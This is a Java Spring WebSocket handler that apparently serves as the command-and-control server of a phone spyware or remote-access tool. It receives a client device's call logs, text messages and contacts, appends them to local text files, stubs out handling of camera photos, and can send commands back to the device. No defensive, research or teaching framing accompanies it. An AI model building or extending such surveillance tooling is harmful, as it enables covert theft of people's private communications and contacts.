package tosatto.simonepio;

import org.springframework.web.socket.BinaryMessage;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;
import org.springframework.web.socket.handler.AbstractWebSocketHandler;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class WebSocketHandler extends AbstractWebSocketHandler {
    private static WebSocketSession session;

    private static BufferedWriter writerText;
    private static File msgFile;

    private static File callsFile;

    private static File contactsFile;

    @Override
    protected void handleTextMessage(WebSocketSession session, TextMessage message) throws IOException {
        // Send back unique message depending on the id received from the client
        String[] messageArr = message.getPayload().split("\\|");
        String command = messageArr[0];
        String data = messageArr[1];

        switch(command){
            case "calls":
                handleCalls(data);
            break;
            case "msg":
                handleMsg(data);
            break;
            case "contacts":
                handleContacts(data);
            break;
            
        }
    }

    private void handleCamera(BinaryMessage message) {
    }

    private void handleMsg(String data) throws IOException {
        //crea file con le colonne per i messaggi etc etc
        //TODO FORMATTA BENE E CREA UNA TABELLA
        writerText = new BufferedWriter(new FileWriter("Files/msg.txt", true));
        writerText.append(data);
        writerText.append("\n");
        writerText.close();

        System.out.println(data);
    }

    private void handleCalls(String data) throws IOException {
        //crea file con le colonne nome telefono durata etc etc
        writerText = new BufferedWriter(new FileWriter("Files/calls.txt", true));
        writerText.append(data);
        writerText.append("\n");
        writerText.close();

        System.out.println(data);
    }

    private void handleContacts(String data) throws IOException {
        //crea file con le colonne per i contatti etc etc
        writerText = new BufferedWriter(new FileWriter("Files/contacts.txt", true));
        writerText.append(data);
        writerText.append("\n");
        writerText.close();
        
        System.out.println(data);
    }


    @Override
    protected void handleBinaryMessage(WebSocketSession session, BinaryMessage message) throws IOException {
        // Send back unique message depending on the id received from the client
        System.out.println("HO RICEVUTO BYTE DAL CLIENT (SONO IL SERVER)");
        System.out.println(message);
        //gestire la foto
        handleCamera(message);
    }

    @Override
    public void afterConnectionEstablished(WebSocketSession session) throws Exception {
        WebSocketHandler.session = session;

        createFolderIfNotExists();
        createMsgFileIfNotExists();
        createCallsFileIfNotExists();
        createContactsFileIfNotExists();
    }

    private void createFolderIfNotExists() {
        File newFolder = new File("./Files");
         
        newFolder.mkdir();
        //boolean created =  newFolder.mkdir(); 
        //if(created)
            //System.out.println("Folder was created !");
        //else
            //System.out.println("Unable to create folder");
    }

    private void createContactsFileIfNotExists() {
        contactsFile = new File("./Files/contacts.txt");
        try {
            if (contactsFile.createNewFile()) {
                //System.out.println("File created: " + contactsFile.getName());
            } else {
                //System.out.println("File already exists.");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void createCallsFileIfNotExists() {
        callsFile = new File("./Files/calls.txt");
        try {
            if (callsFile.createNewFile()) {
                //System.out.println("File created: " + callsFile.getName());
            } else {
                //System.out.println("File already exists.");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void createMsgFileIfNotExists() {
        msgFile = new File("./Files/msg.txt");
        try {
            if (msgFile.createNewFile()) {
                System.out.println("File created: " + msgFile.getName());
            } else {
                System.out.println("File already exists.");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void sendCommand(String command) {
        try {
            session.sendMessage(new TextMessage(command));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}